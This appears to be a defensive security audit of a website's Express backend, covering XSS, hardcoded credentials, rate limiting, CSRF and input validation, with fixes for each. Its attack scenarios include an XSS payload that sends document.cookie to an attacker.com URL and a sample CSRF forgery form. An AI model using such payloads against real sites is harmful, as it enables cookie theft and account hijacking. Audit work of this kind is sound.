# 🔒 SECURITY AUDIT REPORT - Aimhop Trust Website

**Audit Date:** April 10, 2026  
**Severity Levels:** 🔴 CRITICAL | 🟠 HIGH | 🟡 MEDIUM | 🟢 LOW

---

## EXECUTIVE SUMMARY

**Overall Risk Level:** 🔴 **CRITICAL**

The codebase has **7 critical security vulnerabilities** that must be fixed immediately before production deployment. The main issues are:
1. **XSS (Cross-Site Scripting)** - User input directly injected into HTML emails
2. **Missing Input Sanitization** - No HTML escaping in email templates
3. **Hardcoded Fallback Secrets** - Default credentials in code
4. **No Rate Limiting** - API endpoints vulnerable to abuse
5. **No CSRF Protection** - Forms lack CSRF tokens
6. **Missing API Versioning** - No version control on endpoints
7. **No Request Size Limits** - Potential DoS vulnerability

---

## 1. 🔴 CRITICAL: XSS & HTML Injection in Email Templates

### Issue
User input is directly embedded into HTML email templates **without sanitization**:

```javascript
// VULNERABLE CODE in server.js
html: `
  <h2>नमस्ते ${name},</h2>  // ❌ Direct injection
  <li>नाम: ${name}</li>
  <li>ईमेल: ${email}</li>
  <li>संदेश:</li>
  <p>${message}</p>  // ❌ Direct injection
`
```

### Attack Scenario
An attacker could submit:
```
name: "<img src=x onerror='alert(1)'>"
message: "<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>"
```

This would execute in the email client or admin dashboard.

### Fix
Use HTML escaping library:

```javascript
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

// Usage
html: `
  <h2>नमस्ते ${escapeHtml(name)},</h2>
  <li>नाम: ${escapeHtml(name)}</li>
  <p>${escapeHtml(message)}</p>
`
```

**Or use a library:**
```bash
npm install xss
```

---

## 2. 🔴 CRITICAL: Hardcoded Fallback Secrets

### Issue
Default credentials are hardcoded as fallback:

```javascript
// VULNERABLE
const transporter = nodemailer.createTransport({
  auth: {
    user: process.env.EMAIL_USER || 'aimhopgroup@gmail.com',  // ❌ Hardcoded
    pass: process.env.EMAIL_PASS || 'your-app-password'       // ❌ Hardcoded
  }
});
```

If `.env` file is missing, the app uses hardcoded credentials.

### Fix
**Fail fast** - don't provide fallbacks for secrets:

```javascript
if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
  throw new Error('❌ EMAIL_USER and EMAIL_PASS must be set in .env file');
}

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});
```

---

## 3. 🟠 HIGH: No Rate Limiting on API Endpoints

### Issue
All endpoints are unprotected from brute force and DoS attacks:

```javascript
app.post('/api/student-register', async (req, res) => {
  // ❌ No rate limiting - attacker can spam 1000s of requests
});
```

### Attack Scenario
- Attacker sends 10,000 registration requests → 10,000 emails sent → Gmail account blocked
- Attacker floods `/api/contact` → Server crashes from email queue

### Fix
Install rate limiting middleware:

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// Strict limit for registration (5 requests per hour per IP)
const registrationLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5,
  message: 'Too many registrations from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Moderate limit for contact form (10 requests per hour per IP)
const contactLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 10,
  message: 'Too many contact requests, please try again later.',
});

app.post('/api/student-register', registrationLimiter, async (req, res) => {
  // Protected endpoint
});

app.post('/api/contact', contactLimiter, async (req, res) => {
  // Protected endpoint
});
```

---

## 4. 🟠 HIGH: Missing CSRF Protection

### Issue
Forms don't have CSRF tokens. An attacker can forge requests from another site:

```html
<!-- Attacker's website -->
<form action="https://aimhop.com/api/student-register" method="POST">
  <input name="name" value="Hacked">
  <input name="email" value="attacker@evil.com">
  <!-- Auto-submit -->
</form>
```

### Fix
Install CSRF middleware:

```bash
npm install csurf cookie-parser
```

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Middleware to attach CSRF token to responses
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});

// Protect POST endpoints
app.post('/api/student-register', async (req, res) => {
  // CSRF token is automatically validated by middleware
  // ... rest of code
});
```

Frontend:
```html
<form method="POST" action="/api/student-register">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <!-- form fields -->
</form>
```

---

## 5. 🟡 MEDIUM: No Request Size Limits

### Issue
No limit on request body size - attacker can send massive payloads:

```javascript
app.use(express.json()); // ❌ No size limit
```

### Fix
Set strict limits:

```javascript
app.use(express.json({ limit: '10kb' })); // Max 10KB per request
app.use(express.urlencoded({ limit: '10kb', extended: true }));
```

---

## 6. 🟡 MEDIUM: No API Versioning

### Issue
All endpoints are at `/api/...` without version prefix. Future changes will break clients:

```javascript
app.post('/api/student-register', ...);  // ❌ No version
```

### Fix
Implement versioning:

```javascript
// v1 endpoints
app.post('/api/v1/student-register', ...);
app.post('/api/v1/contact', ...);
app.post('/api/v1/college-register', ...);

// Future v2 endpoints can coexist
app.post('/api/v2/student-register', ...);
```

---

## 7. 🟡 MEDIUM: Incomplete Input Validation

### Issue
Only email and phone are validated. Other fields accept any input:

```javascript
// ❌ No validation for these fields
const { name, father, dob, gender, state, district, qualification, course, address, query } = req.body;
```

### Fix
Add comprehensive validation:

```javascript
const validateInput = (data) => {
  const errors = [];

  // Name: 2-100 chars, no special chars
  if (!data.name || data.name.length < 2 || data.name.length > 100) {
    errors.push('Name must be 2-100 characters');
  }
  if (!/^[a-zA-Z\s]+$/.test(data.name)) {
    errors.push('Name can only contain letters and spaces');
  }

  // Phone: exactly 10 digits
  if (!/^[0-9]{10}$/.test(data.phone.replace(/\D/g, ''))) {
    errors.push('Phone must be 10 digits');
  }

  // Email: valid format
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
    errors.push('Invalid email format');
  }

  // State: must be from allowed list
  const allowedStates = ['Bihar', 'UP', 'Jharkhand', 'Maharashtra', 'Nepal'];
  if (!allowedStates.includes(data.state)) {
    errors.push('Invalid state selected');
  }

  // Course: must be from allowed list
  const allowedCourses = ['B.Tech', 'B.Sc', 'BCA', 'MBA', 'Diploma'];
  if (!allowedCourses.includes(data.course)) {
    errors.push('Invalid course selected');
  }

  return errors;
};

app.post('/api/v1/student-register', async (req, res) => {
  const errors = validateInput(req.body);
  if (errors.length > 0) {
    return res.status(400).json({ error: errors });
  }
  // ... rest of code
});
```

---

## 8. 🟢 LOW: Missing Security Headers

### Issue
No security headers in responses:

```javascript
// ❌ Missing headers
app.use(express.json());
```

### Fix
Add security headers middleware:

```bash
npm install helmet
```

```javascript
const helmet = require('helmet');

app.use(helmet()); // Adds security headers automatically
```

This adds:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security: max-age=31536000`

---

## 9. 🟢 LOW: No Logging & Monitoring

### Issue
Errors are logged to console only - no audit trail:

```javascript
console.error(error); // ❌ Not persistent
```

### Fix
Add logging:

```bash
npm install winston
```

```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

app.post('/api/v1/student-register', async (req, res) => {
  try {
    // ... code
    logger.info('Student registered', { email: req.body.email });
  } catch (error) {
    logger.error('Registration failed', { error: error.message });
  }
});
```

---

## DEPENDENCY SECURITY CHECK

### Current Dependencies
```json
{
  "express": "^4.18.2",      ✅ Maintained, secure
  "cors": "^2.8.5",          ✅ Maintained, secure
  "nodemailer": "^6.9.7",    ✅ Maintained, secure
  "dotenv": "^16.3.1",       ✅ Maintained, secure
  "cheerio": "^1.2.0",       ✅ Maintained, secure
  "jsdom": "^29.0.1"         ✅ Maintained, secure
}
```

### Recommended Additions
```json
{
  "express-rate-limit": "^7.1.5",
  "csurf": "^1.11.0",
  "cookie-parser": "^1.4.6",
  "helmet": "^7.1.0",
  "xss": "^1.0.14",
  "winston": "^3.11.0",
  "joi": "^17.11.0"
}
```

---

## PRIORITY FIX ORDER

| Priority | Issue | Effort | Impact |
|----------|-------|--------|--------|
| 🔴 P0 | XSS in emails | 30 min | CRITICAL |
| 🔴 P0 | Hardcoded secrets | 15 min | CRITICAL |
| 🟠 P1 | Rate limiting | 45 min | HIGH |
| 🟠 P1 | CSRF protection | 1 hour | HIGH |
| 🟡 P2 | Input validation | 1 hour | MEDIUM |
| 🟡 P2 | Request size limits | 10 min | MEDIUM |
| 🟢 P3 | Security headers | 10 min | LOW |
| 🟢 P3 | Logging | 30 min | LOW |

---

## IMPLEMENTATION CHECKLIST

- [ ] Install security packages: `npm install express-rate-limit csurf cookie-parser helmet xss winston joi`
- [ ] Add HTML escaping to all email templates
- [ ] Remove hardcoded fallback secrets
- [ ] Implement rate limiting on all POST endpoints
- [ ] Add CSRF protection to forms
- [ ] Set request size limits
- [ ] Implement API versioning (/api/v1/)
- [ ] Add comprehensive input validation
- [ ] Add security headers with Helmet
- [ ] Set up logging with Winston
- [ ] Test all endpoints with security tools
- [ ] Deploy to production

---

## NEXT STEPS

1. **Immediate (Today):** Fix XSS and hardcoded secrets
2. **This Week:** Implement rate limiting and CSRF protection
3. **Before Production:** Complete all P1 and P2 items
4. **Ongoing:** Monitor logs and security advisories

